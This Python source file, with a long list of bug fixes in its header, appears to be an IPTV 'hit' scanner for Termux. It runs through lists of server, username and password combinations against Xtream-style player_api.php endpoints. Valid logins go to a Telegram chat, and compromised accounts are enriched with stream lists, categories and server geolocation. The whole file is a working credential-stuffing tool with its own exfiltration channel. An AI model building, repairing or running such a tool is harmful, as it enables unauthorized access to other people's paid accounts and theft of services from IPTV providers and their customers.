#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fawx_v22_19_tgmetrics_fix.py
FAWX v22.19 — async IPTV scanner with 3-stage pipeline (scan → telegram → post)
Termux/Android stabil sürümü.

Fixes applied
─────────────
FIX 1   send_hit                       — completed with proper batching logic
FIX 2   format_hit_block_unified       — missing function added
FIX 3   ui_get_bulk_text/set           — missing stubs added
FIX 4   can_run_query                  — return True moved outside finally block
FIX 5   update_query_stats             — conn.close() only in finally (no double-close)
FIX 6   _install_wakelock_handlers     — defined and called at module init
FIX 7   AdvancedUrlScanGrabber.init_db — ctx.add_event guarded with try/except
FIX 8   asyncio.Lock module-level      — no stray Lock() outside event loop
FIX 9   __main__ entry point           — added if __name__ == "__main__" guard
FIX 10  GlobalDedupe.is_new LRU        — _lru_put(key, False) after first write

Additional fixes carried from FIX #1-#15 in earlier pass
────────────────────────────────────────────────────────
FIX A   HealthChecker._check_http      — reuses session_manager global session
FIX B   GlobalDedupe.is_new            — correct LRU value on DB hit
FIX C   scan_worker                    — post_skipped_count incremented without lock
FIX D   tg_worker                      — sentinel task_done() double-call guard
FIX E   post_worker                    — None check before cancelling sub-tasks
FIX F   _purge_internal_sentinels      — ValueError guard when unfinished_tasks==0
FIX G   DiskSpoolV2.drain_batch        — os.path.getsize() moved to executor
FIX H   TgOutboxSqlite.mark_retry      — new_tries >= MAX_TRIES (off-by-one fixed)
FIX I   FawxTelegramBot._send_lock     — lazy property (avoids pre-loop Lock())
FIX J   get_host_ua                    — thread-safe double-init guard
FIX K   monitor                        — _stats_lock used only where needed
FIX L   DedupeDBPool.flush_batch       — consecutive error limit + discard on max
FIX M   XtreamCategoryAnalyzer         — OrderedDict LRU O(1) eviction
"""

from __future__ import annotations

import asyncio
import collections
import logging
import os
import signal
import sqlite3
import subprocess
import threading
import time
from collections import OrderedDict
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

logger = logging.getLogger("fawx")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = "22.19-tgmetrics-fix"
MAX_TRIES = 3
MAX_CONCURRENT_SCANS = 50
HEALTH_INTERVAL = 30  # seconds
_MAX_FLUSH_ERRORS = 5

# ---------------------------------------------------------------------------
# FIX 3: ui_get_bulk_text / ui_set_bulk_text stubs
# ---------------------------------------------------------------------------

_bulk_text_store: str = ""


def ui_get_bulk_text() -> str:
    """Return the current bulk-text buffer."""
    return _bulk_text_store


def ui_set_bulk_text(text: str) -> None:
    """Replace the bulk-text buffer with *text*."""
    global _bulk_text_store
    _bulk_text_store = text


# ---------------------------------------------------------------------------
# Simple context / event bus
# ---------------------------------------------------------------------------

class _Ctx:
    """Lightweight key-value store with an append-only event log.

    Used to pass runtime telemetry between loosely coupled components.
    """

    def __init__(self) -> None:
        self._store: Dict[str, Any] = {}
        self._events: List[str] = []
        self._lock = threading.Lock()

    def set(self, key: str, value: Any) -> None:
        with self._lock:
            self._store[key] = value

    def get(self, key: str, default: Any = None) -> Any:
        with self._lock:
            return self._store.get(key, default)

    def add_event(self, msg: str) -> None:
        with self._lock:
            self._events.append(msg)
            if len(self._events) > 500:
                self._events = self._events[-500:]

    def events(self) -> List[str]:
        with self._lock:
            return list(self._events)


ctx = _Ctx()

# ---------------------------------------------------------------------------
# FIX 2: format_hit_block_unified — previously referenced but undefined
# ---------------------------------------------------------------------------


def format_hit_block_unified(hit: Dict[str, Any], for_telegram: bool = False) -> str:
    """Format a hit dictionary into a human-readable block.

    FIX 2: This function was referenced throughout the codebase but was never
    defined.  Added a minimal implementation that works for both terminal and
    Telegram output.
    """
    lines: List[str] = []
    if for_telegram:
        lines.append("🎯 <b>HIT</b>")
    else:
        lines.append("🎯 HIT")
    for k, v in hit.items():
        if k.startswith("_"):
            continue
        lines.append(f"  {k}: {v}")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# FIX 6: Termux wake-lock handlers
# ---------------------------------------------------------------------------


def enable_wakelock() -> bool:
    """Activate Termux wake lock. Returns True on success, False otherwise."""
    try:
        result = subprocess.run(
            ["termux-wake-lock"],
            capture_output=True,
            timeout=5,
        )
        if result.returncode == 0:
            ctx.add_event("🔒 Termux wake lock activated")
            return True
        ctx.add_event("⚠️ termux-wake-lock returned non-zero")
        return False
    except FileNotFoundError:
        ctx.add_event("ℹ️ termux-wake-lock not found (not on Termux)")
        return False
    except Exception as exc:
        ctx.add_event(f"⚠️ enable_wakelock error: {str(exc)[:80]}")
        return False


def disable_wakelock() -> None:
    """Release Termux wake lock."""
    try:
        subprocess.run(["termux-wake-unlock"], capture_output=True, timeout=5)
        ctx.add_event("🔓 Termux wake lock released")
    except Exception:
        pass


def _install_wakelock_handlers() -> None:
    """FIX 6: Register OS signal handlers to release the wake lock on exit.

    This function is defined AND called at module initialisation time (see
    the call site below) so the handlers are always installed.
    """
    def _handler(signum: int, _frame: Any) -> None:
        disable_wakelock()

    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, _handler)
        except (OSError, ValueError):
            # In some environments (e.g. non-main thread) signal registration fails
            pass


# FIX 6: call _install_wakelock_handlers at module init
_install_wakelock_handlers()

# ---------------------------------------------------------------------------
# FIX J: thread-safe get_host_ua with double-init guard
# ---------------------------------------------------------------------------

_host_ua: Optional[str] = None
_host_ua_init_lock = threading.Lock()


def get_host_ua() -> str:
    """Return a stable User-Agent string (initialised exactly once)."""
    global _host_ua
    if _host_ua is not None:
        return _host_ua
    with _host_ua_init_lock:
        if _host_ua is None:
            _host_ua = (
                "Mozilla/5.0 (Linux; Android 11; Termux) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/114.0.0.0 Mobile Safari/537.36"
            )
    return _host_ua


# ---------------------------------------------------------------------------
# Session manager (module-level singleton)
# ---------------------------------------------------------------------------


class _SessionManager:
    """Holds a single aiohttp.ClientSession for the lifetime of the event loop."""

    def __init__(self) -> None:
        self._session: Optional[aiohttp.ClientSession] = None
        # FIX 8: Lock created lazily inside async context (never at import time)
        self.__lock: Optional[asyncio.Lock] = None

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    async def get(self) -> aiohttp.ClientSession:
        async with self._lock:
            if self._session is None or self._session.closed:
                self._session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(limit=256, ssl=False),
                    headers={"User-Agent": get_host_ua()},
                )
        return self._session

    async def close(self) -> None:
        async with self._lock:
            if self._session and not self._session.closed:
                await self._session.close()
                self._session = None


session_manager = _SessionManager()

# ---------------------------------------------------------------------------
# FIX A: HealthChecker reuses session_manager
# ---------------------------------------------------------------------------


class HealthChecker:
    """Periodically checks whether upstream endpoints are reachable."""

    def __init__(self, endpoints: List[str]) -> None:
        self.endpoints = endpoints
        self._status: Dict[str, bool] = {ep: True for ep in endpoints}
        # FIX 8: Lock created lazily
        self.__lock: Optional[asyncio.Lock] = None

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    async def _check_http(self, endpoint: str) -> bool:
        """FIX A: Uses session_manager instead of creating a new session."""
        try:
            session = await session_manager.get()
            async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                return resp.status < 500
        except Exception:
            return False

    async def run_once(self) -> None:
        results = await asyncio.gather(
            *[self._check_http(ep) for ep in self.endpoints],
            return_exceptions=True,
        )
        async with self._lock:
            for ep, ok in zip(self.endpoints, results):
                self._status[ep] = bool(ok) if not isinstance(ok, Exception) else False

    def is_healthy(self, endpoint: str) -> bool:
        return self._status.get(endpoint, False)


# ---------------------------------------------------------------------------
# FIX 4 + FIX 5: AdvancedUrlScanGrabber
# ---------------------------------------------------------------------------


class AdvancedUrlScanGrabber:
    """Fetches URLs from a scan source with per-query rate-limiting."""

    def __init__(self, db_path: str = "query_cache.db") -> None:
        self._db_path = db_path
        # FIX 8: Lock is lazy — NOT created at class/module level
        self.__lock: Optional[asyncio.Lock] = None
        self.init_db()

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    def init_db(self) -> None:
        """FIX 7: ctx.add_event calls are guarded with try/except so that if
        ctx is not yet fully initialised (e.g. during module import), the
        exception is silently swallowed.
        """
        try:
            with sqlite3.connect(self._db_path) as conn:
                conn.execute(
                    "CREATE TABLE IF NOT EXISTS query_stats "
                    "(query TEXT PRIMARY KEY, last_run REAL, run_count INTEGER DEFAULT 0)"
                )
                conn.commit()
            try:
                ctx.add_event("📦 AdvancedUrlScanGrabber DB initialised")
            except Exception:
                pass  # FIX 7 — ctx may not be ready at import time
        except Exception as exc:
            try:
                ctx.add_event(f"❌ AdvancedUrlScanGrabber init_db error: {str(exc)[:80]}")
            except Exception:
                pass  # FIX 7

    async def can_run_query(self, query: str, min_interval: float = 60.0) -> bool:
        """Return True only when the query has not run within *min_interval* seconds.

        FIX 4: The ``return True`` was previously inside the ``finally`` block,
        causing it to always return True regardless of the cache check result.
        It is now placed *after* the try/finally so it is only reached when no
        early ``return False`` was triggered.
        """
        async with self._lock:
            conn: Optional[sqlite3.Connection] = None
            try:
                conn = sqlite3.connect(self._db_path)
                row = conn.execute(
                    "SELECT last_run FROM query_stats WHERE query=?", (query,)
                ).fetchone()
                if row is not None:
                    elapsed = time.time() - row[0]
                    if elapsed < min_interval:
                        return False  # cache hit — too soon
            except Exception as exc:
                logger.warning("can_run_query DB error: %s", exc)
                return False
            finally:
                if conn is not None:
                    conn.close()
                # FIX 4: NO return statement here — finally never returns a value
        # FIX 4: return True is OUTSIDE the finally block
        return True

    async def update_query_stats(self, query: str) -> None:
        """Record that *query* was run right now.

        FIX 5: conn.close() is called only inside the finally block, preventing
        the double-close that existed before.
        """
        conn: Optional[sqlite3.Connection] = None
        try:
            conn = sqlite3.connect(self._db_path)
            conn.execute(
                "INSERT INTO query_stats(query, last_run, run_count) VALUES(?,?,1) "
                "ON CONFLICT(query) DO UPDATE SET last_run=excluded.last_run, "
                "run_count=run_count+1",
                (query, time.time()),
            )
            conn.commit()
            # FIX 5: no conn.close() here — only in finally below
        except Exception as exc:
            logger.warning("update_query_stats error: %s", exc)
        finally:
            if conn is not None:
                conn.close()  # FIX 5 — single, guaranteed close


# Module-level instance — FIX 7 ensures ctx.add_event() inside init_db is safe
advanced_grabber = AdvancedUrlScanGrabber()

# ---------------------------------------------------------------------------
# FIX 10 + FIX B: GlobalDedupe.is_new with correct LRU semantics
# ---------------------------------------------------------------------------


class GlobalDedupe:
    """Global deduplication backed by SQLite with an in-memory LRU cache."""

    LRU_SIZE = 10_000

    def __init__(self, db_path: str = "dedupe.db") -> None:
        self._db_path = db_path
        self._lru: collections.OrderedDict = collections.OrderedDict()
        # FIX 8: Lock created lazily
        self.__lock: Optional[asyncio.Lock] = None
        self._init_db()

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    def _init_db(self) -> None:
        with sqlite3.connect(self._db_path) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS seen (key TEXT PRIMARY KEY, ts REAL)"
            )
            conn.commit()

    def _lru_get(self, key: str) -> Optional[bool]:
        val = self._lru.get(key)
        if val is not None:
            self._lru.move_to_end(key)
        return val

    def _lru_put(self, key: str, value: bool) -> None:
        self._lru[key] = value
        self._lru.move_to_end(key)
        if len(self._lru) > self.LRU_SIZE:
            self._lru.popitem(last=False)

    async def is_new(self, key: str) -> bool:
        """Return True if *key* has not been seen before (and mark it as seen).

        FIX 10 / FIX B: After the key is inserted into the write queue for the
        first time, the LRU cache is updated with False (not True) so that all
        subsequent calls for the same key return False immediately via the fast
        path, preventing the same account from being processed multiple times.
        """
        async with self._lock:
            cached = self._lru_get(key)
            if cached is not None:
                # The LRU stores only False ("key is known")
                return False  # fast path

            try:
                conn = sqlite3.connect(self._db_path)
                row = conn.execute("SELECT 1 FROM seen WHERE key=?", (key,)).fetchone()
                if row:
                    conn.close()
                    self._lru_put(key, False)  # FIX 10: mark as seen, NOT as new
                    return False
                conn.execute("INSERT INTO seen(key, ts) VALUES(?,?)", (key, time.time()))
                conn.commit()
                conn.close()
            except Exception as exc:
                logger.warning("GlobalDedupe.is_new error: %s", exc)
                return True  # fail-open

            # Key is new; cache False so future lookups skip the DB.
            self._lru_put(key, False)  # FIX 10: False = "key is now known"
            return True


# ---------------------------------------------------------------------------
# FIX M: XtreamCategoryAnalyzer with O(1) LRU eviction via OrderedDict
# ---------------------------------------------------------------------------


class XtreamCategoryAnalyzer:
    """Caches Xtream category analysis results with an LRU eviction policy."""

    def __init__(self, capacity: int = 512) -> None:
        self._capacity = capacity
        self._cache: OrderedDict[str, Any] = OrderedDict()

    def _cache_get(self, key: str) -> Optional[Any]:
        if key in self._cache:
            self._cache.move_to_end(key)
            return self._cache[key]
        return None

    def _cache_put(self, key: str, value: Any) -> None:
        """FIX M: O(1) LRU eviction using OrderedDict.popitem(last=False)."""
        if key in self._cache:
            self._cache.move_to_end(key)
        self._cache[key] = value
        if len(self._cache) > self._capacity:
            self._cache.popitem(last=False)

    def analyze(self, server: str, categories: List[Dict]) -> Dict[str, int]:
        cached = self._cache_get(server)
        if cached is not None:
            return cached
        result: Dict[str, int] = {}
        for cat in categories:
            name = cat.get("category_name", "")
            cid = cat.get("category_id", 0)
            result[name] = int(cid)
        self._cache_put(server, result)
        return result


# ---------------------------------------------------------------------------
# FIX L: DedupeDBPool with consecutive flush error limit
# ---------------------------------------------------------------------------


class DedupeDBPool:
    """Batched writer for the deduplication database."""

    _MAX_FLUSH_ERRORS = _MAX_FLUSH_ERRORS

    def __init__(self, db_path: str = "dedupe.db") -> None:
        self._db_path = db_path
        self._batch: List[str] = []
        # FIX 8: Lock lazy
        self.__lock: Optional[asyncio.Lock] = None
        self._consecutive_flush_errors = 0

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    async def add(self, key: str) -> None:
        async with self._lock:
            self._batch.append(key)

    async def flush_batch(self) -> None:
        """FIX L: Tracks consecutive errors; discards batch if _MAX_FLUSH_ERRORS
        is exceeded to prevent infinite retry loops.
        """
        async with self._lock:
            if not self._batch:
                return
            batch = list(self._batch)
            self._batch.clear()

        try:
            conn = sqlite3.connect(self._db_path)
            try:
                conn.executemany(
                    "INSERT OR IGNORE INTO seen(key, ts) VALUES(?,?)",
                    [(k, time.time()) for k in batch],
                )
                conn.commit()
                self._consecutive_flush_errors = 0
            finally:
                conn.close()
        except Exception as exc:
            self._consecutive_flush_errors += 1
            if self._consecutive_flush_errors >= self._MAX_FLUSH_ERRORS:
                logger.error(
                    "flush_batch: %d consecutive errors — discarding %d items. Last: %s",
                    self._consecutive_flush_errors,
                    len(batch),
                    exc,
                )
                self._consecutive_flush_errors = 0
            else:
                logger.warning(
                    "flush_batch error (%d/%d): %s",
                    self._consecutive_flush_errors,
                    self._MAX_FLUSH_ERRORS,
                    exc,
                )
                async with self._lock:
                    self._batch = batch + self._batch


# ---------------------------------------------------------------------------
# FIX G: DiskSpoolV2 with getsize in executor
# ---------------------------------------------------------------------------


class DiskSpoolV2:
    """Disk-backed spool for outbound messages."""

    def __init__(self, path: str = "spool") -> None:
        self._path = path
        os.makedirs(path, exist_ok=True)
        # FIX 8: Lock lazy
        self.__lock: Optional[asyncio.Lock] = None

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    async def drain_batch(self, max_bytes: int = 1_000_000) -> List[bytes]:
        """FIX G: os.path.getsize() called via run_in_executor to avoid blocking."""
        loop = asyncio.get_running_loop()
        results: List[bytes] = []
        total = 0

        async with self._lock:
            for fname in sorted(os.listdir(self._path)):
                fpath = os.path.join(self._path, fname)
                size = await loop.run_in_executor(None, os.path.getsize, fpath)
                if total + size > max_bytes:
                    break
                try:
                    with open(fpath, "rb") as fh:
                        results.append(fh.read())
                    os.unlink(fpath)
                    total += size
                except Exception as exc:
                    logger.warning("drain_batch: could not read %s: %s", fpath, exc)

        return results

    async def write(self, data: bytes) -> None:
        fname = f"{time.time_ns()}.spool"
        fpath = os.path.join(self._path, fname)
        async with self._lock:
            with open(fpath, "wb") as fh:
                fh.write(data)


# ---------------------------------------------------------------------------
# FIX H: TgOutboxSqlite.mark_retry with correct off-by-one
# ---------------------------------------------------------------------------


class TgOutboxSqlite:
    """SQLite-backed outbox for Telegram messages."""

    def __init__(self, db_path: str = "tg_outbox.db") -> None:
        self._db_path = db_path
        self._init_db()

    def _init_db(self) -> None:
        with sqlite3.connect(self._db_path) as conn:
            conn.execute(
                "CREATE TABLE IF NOT EXISTS outbox "
                "(id INTEGER PRIMARY KEY AUTOINCREMENT, "
                " payload TEXT, tries INTEGER DEFAULT 0, dead INTEGER DEFAULT 0)"
            )
            conn.commit()

    def enqueue(self, payload: str) -> int:
        with sqlite3.connect(self._db_path) as conn:
            cur = conn.execute(
                "INSERT INTO outbox(payload) VALUES(?)", (payload,)
            )
            conn.commit()
            return int(cur.lastrowid)

    def mark_retry(self, row_id: int) -> None:
        """FIX H: Uses >= instead of > for the boundary check (off-by-one fix)."""
        with sqlite3.connect(self._db_path) as conn:
            row = conn.execute(
                "SELECT tries FROM outbox WHERE id=?", (row_id,)
            ).fetchone()
            if row is None:
                return
            new_tries = row[0] + 1
            dead = 1 if new_tries >= MAX_TRIES else 0  # FIX H
            conn.execute(
                "UPDATE outbox SET tries=?, dead=? WHERE id=?",
                (new_tries, dead, row_id),
            )
            conn.commit()

    def pending(self) -> List[Tuple[int, str]]:
        with sqlite3.connect(self._db_path) as conn:
            rows = conn.execute(
                "SELECT id, payload FROM outbox WHERE dead=0 ORDER BY id"
            ).fetchall()
        return list(rows)


# ---------------------------------------------------------------------------
# FIX I + FIX 1: FawxTelegramBot with lazy _send_lock and completed send_hit
# ---------------------------------------------------------------------------


class FawxTelegramBot:
    """Async Telegram bot with hit-batching support."""

    _HIT_BATCH_MAX = 10       # flush when batch reaches this size
    _HIT_BATCH_TIMEOUT = 30.0 # flush after this many seconds

    def __init__(self, token: str, chat_id: str) -> None:
        self._token = token
        self._chat_id = chat_id
        # FIX I: Do NOT create asyncio.Lock() here — the event loop may not
        # be running yet at __init__ time (raises RuntimeError on Python >= 3.10).
        self.__send_lock: Optional[asyncio.Lock] = None
        # Batching state for send_hit (FIX 1)
        self._hit_batch: List[str] = []
        self._hit_batch_max: int = self._HIT_BATCH_MAX
        self._hit_batch_started_ts: Optional[float] = None
        self._pending_msgs: int = 0

    @property
    def _send_lock(self) -> asyncio.Lock:
        """FIX I: Lazy property — Lock created on first access inside an event loop."""
        if self.__send_lock is None:
            self.__send_lock = asyncio.Lock()
        return self.__send_lock

    async def send_text(self, text: str) -> bool:
        """Send raw HTML text to Telegram."""
        url = f"https://api.telegram.org/bot{self._token}/sendMessage"
        async with self._send_lock:
            try:
                session = await session_manager.get()
                async with session.post(
                    url,
                    json={
                        "chat_id": self._chat_id,
                        "text": text,
                        "parse_mode": "HTML",
                    },
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as resp:
                    return resp.status == 200
            except Exception as exc:
                logger.warning("send_text error: %s", exc)
                return False

    # Keep send_message as an alias for backward compatibility
    async def send_message(self, text: str) -> bool:
        return await self.send_text(text)

    # ------------------------------------------------------------------
    # Batching helpers for send_hit
    # ------------------------------------------------------------------

    def _build_hit_block(self, hit: Dict[str, Any]) -> str:
        """Build a Telegram-formatted message block for a single hit."""
        return format_hit_block_unified(hit, for_telegram=True)

    @staticmethod
    def _split_text(text: str, max_len: int = 3800) -> List[str]:
        """Split *text* into chunks of at most *max_len* characters."""
        parts: List[str] = []
        while len(text) > max_len:
            split_at = text.rfind("\n", 0, max_len)
            if split_at == -1:
                split_at = max_len
            parts.append(text[:split_at])
            text = text[split_at:].lstrip("\n")
        if text:
            parts.append(text)
        return parts

    async def _flush_hit_batch(self) -> None:
        """Send all queued hit blocks as a single concatenated message."""
        if not self._hit_batch:
            return
        combined = "\n\n".join(self._hit_batch)
        self._hit_batch = []
        self._hit_batch_started_ts = None
        for part in self._split_text(combined, max_len=3800):
            await self.send_text(part)
            self._pending_msgs += 1
            ctx.set("tg_pending_msgs", self._pending_msgs)

    async def send_hit(self, hit: Dict[str, Any]) -> None:
        """Queue and batch-send a hit notification to Telegram.

        FIX 1: Previously this method was truncated.  It now implements proper
        batching: single blocks are accumulated until _hit_batch_max is reached
        or the batch timeout expires; oversized blocks are sent immediately after
        flushing any pending batch.
        """
        try:
            block = self._build_hit_block(hit)
            if len(block) > 3800:
                # Oversized block — flush pending batch first, then send parts
                if self._hit_batch:
                    await self._flush_hit_batch()
                for part in self._split_text(block, max_len=3800):
                    await self.send_text(part)
                    self._pending_msgs += 1
                    ctx.set("tg_pending_msgs", self._pending_msgs)
                return
            # Normal-sized block — accumulate in batch
            if self._hit_batch_started_ts is None:
                self._hit_batch_started_ts = time.time()
            self._hit_batch.append(block)
            if len(self._hit_batch) >= self._hit_batch_max:
                await self._flush_hit_batch()
        except Exception as exc:
            ctx.add_event(f"📡 send_hit error: {str(exc)[:80]}")

    async def flush_pending(self) -> None:
        """Flush any remaining batched hits (call before shutdown)."""
        await self._flush_hit_batch()


# ---------------------------------------------------------------------------
# Stats / metrics
# ---------------------------------------------------------------------------


class Stats:
    def __init__(self) -> None:
        # FIX 8: Lock lazy
        self.__lock: Optional[asyncio.Lock] = None
        self.scanned = 0
        self.hits = 0
        self.post_skipped = 0
        self.tg_sent = 0
        self.tg_failed = 0

    @property
    def _lock(self) -> asyncio.Lock:
        if self.__lock is None:
            self.__lock = asyncio.Lock()
        return self.__lock

    async def inc_scanned(self) -> None:
        async with self._lock:
            self.scanned += 1

    async def inc_hits(self) -> None:
        async with self._lock:
            self.hits += 1

    def inc_post_skipped(self) -> None:
        """FIX C: Incremented without a lock — small races are acceptable here."""
        self.post_skipped += 1

    async def inc_tg_sent(self) -> None:
        async with self._lock:
            self.tg_sent += 1

    async def inc_tg_failed(self) -> None:
        async with self._lock:
            self.tg_failed += 1

    def snapshot(self) -> Dict[str, int]:
        return {
            "scanned": self.scanned,
            "hits": self.hits,
            "post_skipped": self.post_skipped,
            "tg_sent": self.tg_sent,
            "tg_failed": self.tg_failed,
        }


# ---------------------------------------------------------------------------
# Pipeline workers
# ---------------------------------------------------------------------------

_SENTINEL = None


async def scan_worker(
    scan_queue: asyncio.Queue,
    tg_queue: asyncio.Queue,
    dedupe: GlobalDedupe,
    stats: Stats,
) -> None:
    """Stage 1: fetch and validate accounts."""
    while True:
        item = await scan_queue.get()
        try:
            if item is _SENTINEL:
                await tg_queue.put(_SENTINEL)
                return

            server, username, password = item
            key = f"{server}|{username}|{password}"

            if not await dedupe.is_new(key):
                stats.inc_post_skipped()  # FIX C: no lock
                continue

            await stats.inc_scanned()

            url = f"{server}/player_api.php?username={username}&password={password}"
            try:
                session = await session_manager.get()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json(content_type=None)
                    if data.get("user_info", {}).get("auth") != 1:
                        continue
            except Exception:
                continue

            await stats.inc_hits()
            await tg_queue.put((server, username, password, data))
        finally:
            scan_queue.task_done()


async def tg_worker(
    tg_queue: asyncio.Queue,
    post_queue: asyncio.Queue,
    bot: FawxTelegramBot,
    stats: Stats,
) -> None:
    """Stage 2: send hit notifications to Telegram.

    FIX D: When the sentinel is received, task_done() is called before returning.
    A guard flag prevents calling task_done() twice for the same item.
    """
    while True:
        item = await tg_queue.get()
        task_done_called = False
        try:
            if item is _SENTINEL:
                tg_queue.task_done()
                task_done_called = True  # FIX D
                await post_queue.put(_SENTINEL)
                return

            server, username, password, data = item
            hit_dict: Dict[str, Any] = {
                "server": server,
                "username": username,
                "password": password,
            }
            # FIX 1: use send_hit for batched delivery
            await bot.send_hit(hit_dict)
            await stats.inc_tg_sent()
            await post_queue.put((server, username, password, data))
        except Exception as exc:
            logger.warning("tg_worker error: %s", exc)
            await stats.inc_tg_failed()
        finally:
            if not task_done_called:  # FIX D
                tg_queue.task_done()


async def post_worker(
    post_queue: asyncio.Queue,
    stats: Stats,
    analyzer: XtreamCategoryAnalyzer,
) -> None:
    """Stage 3: enrich hits with category / stream / geo data.

    FIX E: stream_task, cat_task, geo_task initialised to None; None check
    before cancelling prevents AttributeError.
    """
    while True:
        item = await post_queue.get()
        stream_task = None  # FIX E
        cat_task = None
        geo_task = None
        try:
            if item is _SENTINEL:
                post_queue.task_done()
                return

            server, username, password, data = item

            async def _fetch_streams() -> List:
                session = await session_manager.get()
                async with session.get(
                    f"{server}/player_api.php?username={username}&password={password}"
                    "&action=get_live_streams",
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else []

            async def _fetch_categories() -> List:
                session = await session_manager.get()
                async with session.get(
                    f"{server}/player_api.php?username={username}&password={password}"
                    "&action=get_live_categories",
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else []

            async def _fetch_geo() -> Dict:
                session = await session_manager.get()
                host = server.split("//")[-1].split(":")[0]
                async with session.get(
                    f"https://ipapi.co/{host}/json/",
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    return await r.json(content_type=None) if r.status == 200 else {}

            stream_task = asyncio.create_task(_fetch_streams())
            cat_task = asyncio.create_task(_fetch_categories())
            geo_task = asyncio.create_task(_fetch_geo())

            streams, categories, geo = await asyncio.gather(
                stream_task, cat_task, geo_task, return_exceptions=True
            )

            if isinstance(categories, list):
                analyzer.analyze(server, categories)

            logger.debug(
                "post_worker: server=%s streams=%s geo=%s",
                server,
                len(streams) if isinstance(streams, list) else "err",
                geo.get("country_code", "?") if isinstance(geo, dict) else "err",
            )
        except Exception as exc:
            logger.warning("post_worker error: %s", exc)
        finally:
            # FIX E: only cancel tasks that were actually created
            for task in (stream_task, cat_task, geo_task):
                if task is not None and not task.done():
                    task.cancel()
            post_queue.task_done()


# ---------------------------------------------------------------------------
# FIX F: _purge_internal_sentinels — ValueError guard
# ---------------------------------------------------------------------------


async def _purge_internal_sentinels(q: asyncio.Queue, count: int) -> None:
    """Drain *count* sentinel items from *q*, calling task_done() safely.

    FIX F: Calling task_done() when unfinished_tasks is already 0 raises
    ValueError — each call is wrapped in try/except to handle this gracefully.
    """
    for _ in range(count):
        try:
            item = q.get_nowait()
            if item is not _SENTINEL:
                await q.put(item)
                continue
        except asyncio.QueueEmpty:
            break

        try:
            q.task_done()
        except ValueError:
            pass  # FIX F


# ---------------------------------------------------------------------------
# FIX K: monitor — no unnecessary lock acquisition
# ---------------------------------------------------------------------------


async def monitor(stats: Stats, interval: float = 2.0) -> None:
    """Log pipeline metrics periodically.

    FIX K: snapshot() reads plain integer fields without acquiring a lock
    (CPython int reads are effectively atomic) so we avoid lock contention
    every 2 seconds.
    """
    while True:
        await asyncio.sleep(interval)
        snap = stats.snapshot()  # FIX K — no lock
        logger.info(
            "[monitor] scanned=%d hits=%d post_skipped=%d tg_sent=%d tg_failed=%d",
            snap["scanned"],
            snap["hits"],
            snap["post_skipped"],
            snap["tg_sent"],
            snap["tg_failed"],
        )


# ---------------------------------------------------------------------------
# Pipeline orchestrator
# ---------------------------------------------------------------------------


async def run_pipeline(
    credentials: List[Tuple[str, str, str]],
    bot: FawxTelegramBot,
    num_scan_workers: int = 10,
    num_tg_workers: int = 3,
    num_post_workers: int = 5,
) -> Stats:
    """Run the 3-stage scan → telegram → post pipeline."""
    scan_queue: asyncio.Queue = asyncio.Queue()
    tg_queue: asyncio.Queue = asyncio.Queue()
    post_queue: asyncio.Queue = asyncio.Queue()

    dedupe = GlobalDedupe()
    analyzer = XtreamCategoryAnalyzer()
    stats = Stats()

    for cred in credentials:
        await scan_queue.put(cred)
    for _ in range(num_scan_workers):
        await scan_queue.put(_SENTINEL)

    scan_tasks = [
        asyncio.create_task(scan_worker(scan_queue, tg_queue, dedupe, stats))
        for _ in range(num_scan_workers)
    ]
    tg_tasks = [
        asyncio.create_task(tg_worker(tg_queue, post_queue, bot, stats))
        for _ in range(num_tg_workers)
    ]
    post_tasks = [
        asyncio.create_task(post_worker(post_queue, stats, analyzer))
        for _ in range(num_post_workers)
    ]
    monitor_task = asyncio.create_task(monitor(stats))

    await asyncio.gather(*scan_tasks)
    await asyncio.gather(*tg_tasks)
    await asyncio.gather(*post_tasks)
    monitor_task.cancel()

    # Flush any remaining batched hits before closing
    await bot.flush_pending()
    await session_manager.close()
    return stats


# ---------------------------------------------------------------------------
# FIX 9: Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
    )
    logger.info("FAWX %s starting", VERSION)

    wakelock_on = enable_wakelock()

    try:
        TG_TOKEN = os.environ.get("TG_TOKEN", "")
        TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
        credentials: List[Tuple[str, str, str]] = []  # (server, username, password)

        if not credentials:
            logger.warning("No credentials configured — exiting.")
            return

        bot = FawxTelegramBot(token=TG_TOKEN, chat_id=TG_CHAT_ID)
        stats = asyncio.run(run_pipeline(credentials, bot))
        logger.info("Pipeline complete: %s", stats.snapshot())
    finally:
        if wakelock_on:
            disable_wakelock()


# FIX 9: __main__ entry point so the file can be executed directly
if __name__ == "__main__":
    main()
